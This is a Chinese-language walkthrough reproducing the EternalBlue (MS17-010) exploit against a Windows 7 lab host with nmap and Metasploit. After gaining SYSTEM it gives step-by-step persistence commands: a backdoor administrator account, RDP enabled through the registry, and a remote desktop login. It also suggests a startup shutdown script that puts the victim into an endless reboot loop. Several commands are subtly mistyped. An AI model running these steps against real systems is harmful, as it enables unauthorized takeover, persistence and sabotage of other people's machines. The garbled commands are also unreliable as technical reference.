介绍
永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。
永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。

smb服务：提供对服务器中文件、打印资源的共享访问，端口号为 139 445。它主要是用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS(Server Message Block/Common Internet File System)网络协定做连结。

复现环境
Windows7系统          目标主机 192.168.0.25
kali linux                      攻击源     192.168.0.26

1 & nmap扫描网段存活主机端口
nmap -p 445,139 192.168.0.1\24 

如图:445 是open状态说明端口开放

2启动msf  (终端执行msfconsole命令启动msf)


搜索ms17-010代码 (msf > search ms17_010)




auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。


3.使用ms17-010漏洞模块对win7主机扫描


使用模块

msf> use auxiliary/ scanner/ smb/smb_ms17_10


设置ip


msf  auxiliary/ scanner/ smb/smb_ms17_10

  set  rhosts  192.168.0.25


查看设置选项

msfexploit(windows/smb/ms17_010_eternalblue) >

show options

执行攻击 

msfexploit(windows/smb/ms17_010_eternalblue) >

exploit

如下图 执行攻击完毕获得目标主机的system权限

直接拿到Win7的权限，之后便可以通过Shell对目标靶机进行控制。



这里顺便说下权限吧，window系统权限由高到低是 system  administration guest


要想权限维持且横向深入我们需要新建用户，添加规则等等 


新建用户

net user  CK  147250 / add


把CK用户添加到管理员组

netlocalgroup administrators CK /add


开启rdb远程桌面

REGADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /vfDenyTSConnections /t REG_DWORD /d 0 /f


kali远程连接Windows7桌面

rdesktop192.168.0.25:3389




比如在开机启动中添加 批处理shutdown -s -t 10

倒计时10秒关机。那么目标主机会在下次开机中无限重启 

其实只要权限够，拿到目标主机后 可以做很多事情  。你们自行脑补吧
